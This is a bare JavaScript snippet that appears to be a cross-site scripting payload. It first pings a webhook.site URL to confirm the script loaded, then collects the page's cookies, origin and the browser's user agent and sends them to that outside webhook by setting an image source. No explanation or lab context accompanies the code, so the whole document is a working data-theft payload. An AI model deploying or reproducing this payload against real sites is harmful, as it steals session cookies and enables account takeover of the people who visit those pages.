fetch("https://webhook.site/05a4982f-0a9e-466b-b20d-37e3ae1274d6?xss_loaded=true");

let data = {
  c: document.cookie,
  o: location.origin,
  u: navigator.userAgent
};

new Image().src = 'https://webhook.site/05a4982f-0a9e-466b-b20d-37e3ae1274d6?' + new URLSearchParams(data);
